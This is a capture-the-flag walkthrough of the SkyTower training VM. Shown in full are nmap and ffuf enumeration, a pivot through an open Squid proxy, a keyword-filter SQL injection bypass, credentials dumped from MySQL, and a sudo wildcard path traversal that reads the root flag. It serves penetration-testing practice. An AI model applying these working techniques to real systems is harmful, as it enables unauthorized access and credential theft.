# Description
This CTF was designed by Telspace Systems for the CTF at the ITWeb Security Summit and BSidesCPT (Cape Town). The aim is to test intermediate to advanced security enthusiasts in their ability to attack a system using a multi-faceted approach and obtain the "flag".

You will require skills across different facets of system and application vulnerabilities, as well as an understanding of various services and how to attack them. Most of all, your logical thinking and methodical approach to penetration testing will come into play to allow you to successfully attack this system. Try different variations and approaches. You will most likely find that automated tools will not assist you.

We encourage you to try it our for yourself first, give yourself plenty of time and then only revert to the Walkthroughs below.

Enjoy!

Telspace Systems

@telspacesystems

# Write-up

This is a quite old VM by now, so I focused on finding the intended solution and avoid using any vulnerability found since it was created.
Started by enumerating the target with nmap, first just checking for open ports and filtering it down from there:
```
$ nmap -n 10.0.2.6
PORT     STATE    SERVICE
22/tcp   filtered ssh
80/tcp   open     http
3128/tcp open     squid-http
```
So SSH is filtered, it's likely hosting a webpage, and we have squid proxy running on the system. From this, I can further enumerate the system:
```
$ nmap -sC -sV -T5 10.0.2.6 -p 22,80,3128
PORT     STATE    SERVICE    VERSION
22/tcp   filtered ssh
80/tcp   open     http       Apache httpd 2.2.22 ((Debian))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.2.22 (Debian)
3128/tcp open     http-proxy Squid http proxy 3.1.20
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported: GET HEAD
|_http-title: ERROR: The requested URL could not be retrieved
|_http-server-header: squid/3.1.20
```
So this tells us that we have a potentially open proxy, something important to keep in mind later on. Meanwhile, took a look at the webpage to see what it is serving, and it looks like a simple login page.
![](./Images/skytower_page.png)

Source code didn't turn out anything useful, and just testing a random username:password takes us to `/login.php` with message `login failed`.
Decided to quickly fuzz for common Apache and PHP files/folders with ffuf
```
$ ffuf -u http://ip/FUZZ -w ~/SecLists/Discovery/Web-Content/Apache.fuzz.txt         

.htpasswd               [Status: 403, Size: 285, Words: 21, Lines: 11, Duration: 2ms]
.htaccess               [Status: 403, Size: 285, Words: 21, Lines: 11, Duration: 4ms]
index.html              [Status: 200, Size: 1136, Words: 176, Lines: 34, Duration: 10ms]
server-status           [Status: 403, Size: 289, Words: 21, Lines: 11, Duration: 13ms]
.htaccess.bak           [Status: 403, Size: 289, Words: 21, Lines: 11, Duration: 14ms]
```
```
$ ffuf -u http://ip/FUZZ -w ~/SecLists/Discovery/Web-Content/Common-PHP-Filenames.txt

login.php               [Status: 200, Size: 21, Words: 2, Lines: 1, Duration: 477ms]
```
Nothing too interesting on the PHP side, but a couple of good hits on the apache scan. Of course trying to get any of these is met with a `403 - Forbidden`, so focused my attention on the potentially open proxy that nmap found.
Using a simple curl command:
```
curl --proxy http://ip:3128 http://localhost/server-status
```
Displays the apache server status log, so this confirms we have an open proxy. Testing any `.hta*` file didn't get any success, and the server status log will only show our own connections so it's of limited use.
At this point decided to use `https://github.com/aancw/spose` to scan for open ports behind the squid proxy:
```
$ python spose.py --proxy http://ip:3128 --target localhost 
localhost 22 seems OPEN 
localhost 80 seems OPEN 
```
So we now have a way to get to the SSH port, but no users to do anything with it yet. Focusing my attention back on the previous login page, decided to test for potential SQL injections on the login forms and hit an SQL error while using a `'`. Injecting `username= a'` we get:
```
There was an error running the query [You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'a'' at line 1]
```

Testing with multiple SQLi's I found that multiple keywords are filtered out, so can't use `"SELECT", "TRUE", "FALSE", "--","OR", "=", ",", "AND", "NOT"` and eventually got a hit using `'||1#`. This landed me on: 
![](./Images/skytower_user.png)


So now we have user credentials `john:hereisjohn` and can use the open proxy to SSH into the system.
Used proxychains to make this easier:
```
$ proxychains ssh john@localhost            
john@localhost's password: 
Linux SkyTower 3.2.0-4-amd64 #1 SMP Debian 3.2.54-2 x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Nov 21 12:02:41 2023 from localhost

Funds have been withdrawn
Connection to localhost closed.
```
The connection is getting closed, but this can be bypassed by removing .bashrc:
```
$ proxychains ssh john@localhost '/bin/bash'
rm .bashrc
```
We already had a shell with the command above, but SSH is much nicer to use.
First thing was to go back to the webroot and see if there was anything else I could use from there. Looking into the `login.php` file we find:
```
<?php

$db = new mysqli('localhost', 'root', 'root', 'SkyTech');

if($db->connect_errno > 0){
    die('Unable to connect to database [' . $db->connect_error . ']');

}

$sqlinjection = array("SELECT", "TRUE", "FALSE", "--","OR", "=", ",", "AND", "NOT");
$email = str_ireplace($sqlinjection, "", $_POST['email']);
$password = str_ireplace($sqlinjection, "", $_POST['password']);

$sql= "SELECT * FROM login where email='".$email."' and password='".$password."';";
$result = $db->query($sql);

```
So this validates the previous finds about filtered keywords, and also provides mysql credentials and a database to look into:
```
john@SkyTower:~$ mysql -uroot -proot

mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| SkyTech            |
| mysql              |
| performance_schema |
+--------------------+

mysql> use SkyTech;
mysql> show tables;
+-------------------+
| Tables_in_SkyTech |
+-------------------+
| login             |
+-------------------+

mysql> select * from login;
+----+---------------------+--------------+
| id | email               | password     |
+----+---------------------+--------------+
|  1 | john@skytech.com    | hereisjohn   |
|  2 | sara@skytech.com    | ihatethisjob |
|  3 | william@skytech.com | senseable    |
+----+---------------------+--------------+
3 rows in set (0.00 sec)
```
So now we have 3 users and credentials
```
john:hereisjohn
sara:ihatethisjob
william:senseable
```
Further enumeration from John's context didn't turn out anything useful, so moved on to the other users.
SSH'ing with Sara, and enumeration showed that this user can run a few commands with sudo:
```
sara@SkyTower:~$ sudo -l
Matching Defaults entries for sara on this host:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User sara may run the following commands on this host:
    (root) NOPASSWD: /bin/cat /accounts/*, (root) /bin/ls /accounts/*
```
Given that using `*` in this way is insecure, this allows us to list the target `flag.txt` file in root using:
```
sara@SkyTower:~$ sudo ls /accounts/../root/
flag.txt
sara@SkyTower:~$ sudo cat /accounts/../root/flag.txt
Congratz, have a cold one to celebrate!
root password is theskytower
sara@SkyTower:~$ 
```